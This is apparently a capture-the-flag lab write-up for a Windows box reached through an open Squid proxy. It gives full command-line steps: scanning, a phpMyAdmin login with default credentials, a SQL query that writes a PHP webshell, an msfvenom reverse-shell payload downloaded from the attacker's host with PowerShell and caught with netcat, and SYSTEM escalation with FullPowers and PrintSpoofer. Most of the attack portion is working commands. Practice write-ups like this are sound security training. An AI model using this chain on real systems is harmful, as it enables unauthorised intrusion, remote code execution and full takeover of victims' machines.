# Squid

## Enumeration & scanning

- Find Squid forward proxy with normal scanning
- Check if proxy open with `nmap` and `spose`. Results differ, `spose` seems more accurate.
- Port `3306` and `8080` seem open behind proxy.
- Setup proxy config in FoxyProxy in browser and browse to `127.0.0.1:8080`. Can also do stuff with proxychains but not really necessary.
- `8080` seems to host Wampserver.

``` sh
# Default scanning
sudo nmap -p- 192.168.221.189
sudo nmap -p 135,139,445,3128,49666,49667 -A 192.168.221.189

# Squid proxy
# Check if open
nmap -Pn -sV -p 3128 --script http-open-proxy 192.168.221.189
# Second check (different result)
python spose.py --proxy http://192.168.221.189:3128 --target 192.168.221.189

# Connect to Wampserver
# Validate
curl --proxy http://192.168.221.189:3128 http://192.168.221.189:8080
# Connect (browser)
http://127.0.0.1:8080
```

## Exploitation

- We can get a lot of system information using the dashboard. We have access to `phpinfo()` and see that server is being hosted in `C:\wamp\www`.
- We can browse to `phpmyadmin` and login with default credentials `root:<NULL>`.
We can run SQL queries and therefore create a webshell. From there we can get a reverse shell and the flag.

``` sh
# Webshell
# Go to SQL tab to submit query to create webshell
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php"
# Go to http://127.0.0.1:8080/shell.php?cmd=whoami
nt authority\local service
# Get reverse shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f exe -o shell.exe
python3 -m http.server 80
http://127.0.0.1:8080/shell.php?cmd=powershell%20-command%20%22iwr%20-uri%20http://192.168.45.175/shell.exe%20-Outfile%20shell.exe%22
nc -nlvp 4444
http://127.0.0.1:8080/shell.php?cmd=shell.exe
# Get flag
C:\>type local.txt
type local.txt
16874daf06ca36e3cd688d9c6703f0fe
```

## Privilege Escalation

- We are `nt authority\local service`. This account is supposed to have a set of permissions which we don't seem to have. We need to reset those (see references).
- Run the tool to reset these. This gives us `seImpersonate`.
- Elevate privileges using `PrintSpooler` binary.

``` sh
# Reset privileges to typical LOCAL SERVICE
iwr -uri http://192.168.45.237/FullPowers.exe -Outfile FullPowers.exe
FullPowers.exe
whoami /priv
# Escalate to SYSTEM
iwr -uri http://192.168.45.237/PrintSpoofer64.exe -Outfile printspoofer.exe
PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
# Get flag
```

## References

- https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
- https://medium.com/@toon.commander/uploading-a-shell-in-phpmyadmin-61b066b481a7
- https://github.com/itm4n/FullPowers
- https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-local-service-or-network-service-to-full-privs
- https://github.com/itm4n/PrintSpoofer

## Rabbit holes

- Service binaries were overwritable with permissions (Apache, MySQL), but no way to restart the services.
